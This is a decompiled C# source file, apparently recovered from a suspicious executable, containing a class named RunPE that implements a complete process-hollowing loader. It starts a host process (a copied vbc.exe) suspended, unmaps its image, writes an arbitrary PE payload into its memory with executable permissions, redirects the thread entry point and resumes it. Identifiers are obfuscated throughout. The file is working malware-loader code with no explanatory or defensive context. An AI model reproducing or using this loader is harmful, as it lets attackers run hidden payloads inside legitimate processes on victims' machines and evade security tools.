// Decompiled with JetBrains decompiler
// Type: Phulli.RunPE
// Assembly: Phulli, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5588EA96-561C-40B7-9B78-06ECD0A07CB4
// Assembly location: C:\Users\Voltaren\Desktop\infocenter247 HK.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Phulli
{
  public class RunPE
  {
    [DebuggerNonUserCode]
    public RunPE()
    {
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr Ð, IntPtr Ö, byte[] Æ, IntPtr Ü, ref IntPtr Ù);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool VirtualProtectEx(IntPtr Ö, IntPtr Ë, IntPtr Ó, int Â, ref int Ð);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr Á, IntPtr Æ, IntPtr Ú, int Û, int Ë);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool SetThreadContext(IntPtr Ã, uint[] Ì);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int ResumeThread(IntPtr Á);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr Ø, IntPtr Å, ref IntPtr Ç, IntPtr ß, ref IntPtr Ò);

    [DllImport("ntdll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern uint NtUnmapViewOfSection(IntPtr Æ, IntPtr Æ);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool GetThreadContext(IntPtr Â, uint[] Þ);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool CreateProcessA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Ÿ, StringBuilder È, IntPtr Û, IntPtr Ò, bool Ã, int Þ, IntPtr Ø, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ß, byte[] Ð, IntPtr[] É);

    public static void PE(byte[] data)
    {
      string str1 = Assembly.GetEntryAssembly().Location;
      if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
      {
        string sourceFileName = Conversions.ToString(Environment.SystemDirectory[0]) + ":\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe";
        string str2 = Path.ChangeExtension(Path.Combine(Path.GetTempPath() + Path.GetRandomFileName() + "\\", "vbc"), "exe");
        Directory.CreateDirectory(Path.GetDirectoryName(str2));
        File.Copy(sourceFileName, str2);
        str1 = str2;
      }
      byte[] Æ1 = data;
      int int32 = BitConverter.ToInt32(Æ1, 60);
      int int16 = (int) BitConverter.ToInt16(Æ1, checked (int32 + 6));
      IntPtr Ü1 = new IntPtr(BitConverter.ToInt32(Æ1, checked (int32 + 84)));
      byte[] numArray1 = new byte[68];
      IntPtr[] numArray2 = new IntPtr[4];
      string str3 = (string) null;
      ref string local1 = ref str3;
      StringBuilder È = new StringBuilder(str1);
      IntPtr num1;
      IntPtr Û1 = num1;
      IntPtr Ò = num1;
      int num2 = 0;
      int Þ = 4;
      IntPtr Ø = num1;
      string str4 = (string) null;
      ref string local2 = ref str4;
      byte[] Ð1 = numArray1;
      IntPtr[] É = numArray2;
      if (!RunPE.CreateProcessA(ref local1, È, Û1, Ò, num2 != 0, Þ, Ø, ref local2, Ð1, É))
        return;
      uint[] numArray3 = new uint[179];
      numArray3[0] = 65538U;
      IntPtr Ç;
      IntPtr num3;
      if (RunPE.GetThreadContext(numArray2[1], numArray3) && (RunPE.ReadProcessMemory(numArray2[0], new IntPtr(checked ((long) numArray3[41] + 8L)), ref Ç, new IntPtr(4), ref num3) && RunPE.NtUnmapViewOfSection(numArray2[0], Ç) == 0U))
      {
        IntPtr Á = numArray2[0];
        IntPtr num4 = new IntPtr(BitConverter.ToInt32(Æ1, checked (int32 + 52)));
        IntPtr Æ2 = num4;
        IntPtr num5 = new IntPtr(BitConverter.ToInt32(Æ1, checked (int32 + 80)));
        IntPtr Ú = num5;
        int Û2 = 12288;
        int Ë = 64;
        IntPtr Ö1 = RunPE.VirtualAllocEx(Á, Æ2, Ú, Û2, Ë);
        bool flag = RunPE.WriteProcessMemory(numArray2[0], Ö1, Æ1, Ü1, ref num3);
        int num6 = 0;
        int num7 = checked (int16 - 1);
        int num8 = num6;
        while (num8 <= num7)
        {
          int[] numArray4 = new int[10];
          Buffer.BlockCopy((Array) Æ1, checked (int32 + 248 + num8 * 40), (Array) numArray4, 0, 40);
          byte[] numArray5 = new byte[checked (numArray4[4] - 1 + 1)];
          Buffer.BlockCopy((Array) Æ1, numArray4[5], (Array) numArray5, 0, numArray5.Length);
          IntPtr Ð2 = numArray2[0];
          num5 = new IntPtr(checked (Ö1.ToInt32() + numArray4[3]));
          IntPtr Ö2 = num5;
          byte[] Æ3 = numArray5;
          num4 = new IntPtr(numArray5.Length);
          IntPtr Ü2 = num4;
          ref IntPtr local3 = ref num3;
          flag = RunPE.WriteProcessMemory(Ð2, Ö2, Æ3, Ü2, ref local3);
          checked { ++num8; }
        }
        IntPtr Ð3 = numArray2[0];
        num5 = new IntPtr(checked ((long) numArray3[41] + 8L));
        IntPtr Ö3 = num5;
        byte[] bytes = BitConverter.GetBytes(Ö1.ToInt32());
        num4 = new IntPtr(4);
        IntPtr Ü3 = num4;
        ref IntPtr local4 = ref num3;
        flag = RunPE.WriteProcessMemory(Ð3, Ö3, bytes, Ü3, ref local4);
        numArray3[44] = checked ((uint) (Ö1.ToInt32() + BitConverter.ToInt32(Æ1, int32 + 40)));
        RunPE.SetThreadContext(numArray2[1], numArray3);
      }
      RunPE.ResumeThread(numArray2[1]);
    }
  }
}
